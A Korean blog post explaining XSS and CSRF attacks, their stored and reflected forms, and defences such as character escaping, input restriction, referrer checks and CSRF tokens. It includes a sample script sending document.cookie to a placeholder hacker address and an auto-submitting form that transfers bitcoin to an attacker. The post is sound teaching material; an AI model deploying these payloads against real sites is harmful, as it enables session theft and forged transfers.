---
layout : posts

title : "XSS 와 CSRF"

date : 2021-07-10

categories : web

comments : true
---



전 포스팅 중 [CORS 란](https://pkt369.github.io/web/CORS%EB%9E%80/)을 적으면서 XSS와 CSRF에 대해 한번 언급한적이 있다.

XSS 와 CSRF 는 해킹 방법이며, 이전 포스팅인 CORS와 SOP가 해킹을 보안하기 위해 만든 정책입니다.

XSS와 CSRF 가 정확히 무엇이길래 CORS와 SOP 정책이 나오게 되었을까?

이번 포스팅에서 자세히 알아보자.

<br>

### XSS

XSS는 Cross-Site Scripting (사이트 간 스크립팅)을 의미하며 웹 애플리케이션에서 많이 나타나는 취약점 중 하나로, 개발자가 아닌 다른 사람이 웹 페이지에 악성 스크립트를 삽입하는 것을 말한다.

주로 다른 웹사이트와 정보를 교환하는 식으로 나타나기 때문에 사이트 간 스크립팅이라고 부른다.

<br>

서버 사이트 스크립팅은 언제 일어나게 될까?

웹 애플리케이션이 사용자로부터 입력 받은 값을 제대로 검사하지 않고 사용할 경우 나타난다.

<br>

그럼 어떻게 될까?

성공시 사이트에 접속한 사용자는 삽입된 코드를 실행하게 된다.

코드를 실행하게 되면 쿠키나 세션같은 민감한 정보들을 탈취한다.

<br>

좀더 이해하기 쉽게 예를 들어 설명해보겠다.

한 해커가 웹사이트를 해킹하기 위해 게시글에 쿠키를 빼오는 자바스크립트를 넣었다.

```javascript
<script>window.location = "https://해커의 주소/?cookie=" + document.cookie</script>
```

그럼 일반 사용자는 해당 게시글을 클릭시, 자동으로 악성코드가 발동되어 쿠키 정보가 해커에게 넘어

간다.

<br>

위의 설명은 Stored XSS 이다. 그럼 다른 XSS도 있을까?

XSS는 두가지 종류가 있는데 Stored XSS 와 Reflected XSS가 있다.

Stored XSS 는 사이트 게시판이나 댓글, 닉네임 등 스크립트가 서버에 저장되어 실행되는 방식이고, Reflected XSS는 보통 URL 파라미터(주로 GET)에 스크립트를 넣어 서버에 저장하지 않고 그 즉시 스크립트를 만드는 방식이다. 하지만 Reflected XSS 같은 경우는 브라우저가 차단하기때문에 공격을 성공시키기 어렵다.

<br>

그럼 대응방안은 어떤게 있을까?

1. SCRIPT문장에 존재하는 특수문자를 메타캐릭터로 변환시킨다.

   ![xssEncoding](https://user-images.githubusercontent.com/66049273/125160019-b829a800-e1b5-11eb-85b3-15a730a12a58.jpg)

   참조 : 구글 이미지

2. 파라미터 입력 값 제한

   만약 받는 파라미터를 id 값만 받아오기로 했다면 숫자만 받을수있도록 설정해놓으면 다른 값은 들어올수 없게 된다.

<br>

<br>

### CSRF

CSRF(Cross-Site Request Forgery)는사이트 간 요청 위조라고도 부르며, 사용자가 자신의 의지와 무관하게 공격자가 의도한 행위(수정, 삭제 등)를 요청하게한것을 말한다.

<br>

CSRF는 언제 일어나게 될까?

사용자가 로그인한 상태에서 요청 위조 공격 코드가 삽입된 웹페이지를 열면, 공격 대상이 되는 웹사이트는 위조된 공격 명령이 믿을 수 있는 사용자로 부터 발송된 것으로 판단되어 공격을 받을수 있게 된다.

<br>

그럼 어떻게 될까?

사용자가 자신의 의지와는 무관하게 공격자가 의도한 행위(수정, 삭제 등)을 요청하게 된다.

<br>

좀더 이해하기 쉽게 요즘 핫한 코인 거래소를 예를 들어 설명해보겠다.

사용자가 코인거래소에 로그인하고 해커의 페이지에 방문을 한다.

해커 페이지는 코드를 만들어 자신의 코인 주소로 전송 시키도록 보낸다.

```javascript
<form action="코인 주소" method="POST">
    <input name="받는 사람" value="해코 코인 주소">
    <input name="코인 이름" value="비트코인">
    <input name="개수" value=50>
</form>
<script>document.forms[0].submit()</script>
```

코인 거래소는 사용자의 인증정보를 가지고 request를 받았기때문에 정상적인 요청이라고 인식을 한다.

이렇게 되면 나도모르는 사이 돈이 빠져나가는 것을 볼수 있다.

<br>

그럼 대응방안으로 무엇이 있을까?

1. Referrer 검증

   백엔드에서 request의 referrer를 확인하여 domain이 일치하는지 검증

   즉, 보낸 주소와 현재 domain을 비교 (CORS와 같은 개념)

2. Security Token 사용(CSRF Token)

   사용자 세션에 임의의 난수 값을 저장하고, 사용자 요청마다 난수 값을 포함시켜 전송한다.

   백엔드에서 요청받은 토큰값과 세션에 저장된 토큰 값이 같은지 검증

<br>

<br>

### XSS와 CSRF의 차이점

|                  XSS                  |                CSRF                 |
| :-----------------------------------: | :---------------------------------: |
| 쿠키나 세션같은 중요한 정보 탈취 목적 | 사이트 간 요청을 위조하여 서버 요청 |
|             스크립트 필요             |           스크립트 불필요           |

<br>

<br>

### 정리

마지막으로 정리를 하자면 XSS는 스크립트를 통해 쿠키나 세션을 탈취를 하고 CSRF는 해커사이트에 들어가면 스크립트가 실행이되면서 다른 사이트에 요청이 들어가게 되는것이다.







